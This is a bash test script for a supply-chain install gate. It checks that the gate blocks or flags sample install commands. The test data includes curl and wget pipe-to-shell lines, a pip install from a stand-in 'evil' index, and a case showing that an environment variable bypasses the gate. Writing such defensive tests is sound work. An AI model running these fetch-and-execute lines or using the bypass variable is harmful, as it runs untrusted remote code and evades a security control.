#!/usr/bin/env bash
# test-install-gate.sh — Unit tests for scripts/automation/lib/install-gate.py
#
# Usage: ./tests/automation/test-install-gate.sh
#
# Tests the supply-chain security gate logic by passing known-good and
# known-bad install commands and verifying the decision output.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

GATE="$REPO_ROOT/scripts/automation/lib/install-gate.py"
POLICY="$REPO_ROOT/config/install-security-policy.json"

PASS=0
FAIL=0

# ── Helpers ───────────────────────────────────────────────────────────────────

run_gate() {
  local cmd="$1"
  python3 "$GATE" \
    --command "$cmd" \
    --policy "$POLICY" \
    --repo-root "$REPO_ROOT" \
    --dry-run 2>/dev/null
}

decision_of() {
  # The gate exits non-zero for block/require_approval BY DESIGN; under this
  # script's pipefail that made the pipeline "fail" and appended a spurious
  # "error" line to a perfectly valid decision. Capture output first.
  local out
  out=$(run_gate "$1" || true)
  printf '%s' "$out" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('decision','unknown'))" 2>/dev/null || echo "error"
}

assert_decision() {
  local label="$1"
  local cmd="$2"
  local expected="$3"
  local actual
  actual=$(decision_of "$cmd")
  if [[ "$actual" == "$expected" ]]; then
    echo "  PASS  $label"
    PASS=$((PASS + 1))
  else
    echo "  FAIL  $label"
    echo "        command:  $cmd"
    echo "        expected: $expected"
    echo "        actual:   $actual"
    FAIL=$((FAIL + 1))
  fi
}

# ── Tests ─────────────────────────────────────────────────────────────────────

echo ""
echo "=== install-gate tests ==="
echo ""

# Pip: pinned package on empty allowlist → review required (not outright deny)
assert_decision \
  "pip install with version pin" \
  "pip install requests==2.31.0" \
  "require_approval"

# Pip: unpinned package → review required
assert_decision \
  "pip install unpinned" \
  "pip install requests" \
  "require_approval"

# Pip: --index-url pointing to non-PyPI source → deny
assert_decision \
  "pip install custom index" \
  "pip install mypackage --index-url https://evil.example.com/simple" \
  "block"

# npm: pinned package → review required
assert_decision \
  "npm install pinned" \
  "npm install lodash@4.17.21" \
  "require_approval"

# curl pipe to bash → deny
assert_decision \
  "curl|bash pattern" \
  "curl https://example.com/install.sh | bash" \
  "block"

# curl pipe to sh → deny
assert_decision \
  "curl|sh pattern" \
  "curl https://example.com/install.sh | sh" \
  "block"

# wget pipe to bash → deny
assert_decision \
  "wget|bash pattern" \
  "wget -O - https://example.com/setup.sh | bash" \
  "block"

# git clone of unknown repo → review required
assert_decision \
  "git clone unknown" \
  "git clone https://github.com/unknown/repo.git" \
  "require_approval"

# Bypass env var overrides gate → allow
CHAIN_INSTALL_GATE_BYPASS=true \
  python3 "$GATE" \
    --command "curl https://evil.example.com/install.sh | bash" \
    --policy "$POLICY" \
    --repo-root "$REPO_ROOT" \
    --dry-run 2>/dev/null \
  | python3 -c "
import json, sys
d = json.load(sys.stdin)
actual = d.get('decision', 'unknown')
expected = 'allow'
if actual == expected:
    print('  PASS  bypass env var overrides gate')
else:
    print(f'  FAIL  bypass env var overrides gate (expected: {expected}, actual: {actual})')
    sys.exit(1)
" && PASS=$((PASS + 1)) || FAIL=$((FAIL + 1))

# ── Results ───────────────────────────────────────────────────────────────────

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
echo ""

if [[ $FAIL -gt 0 ]]; then
  exit 1
fi
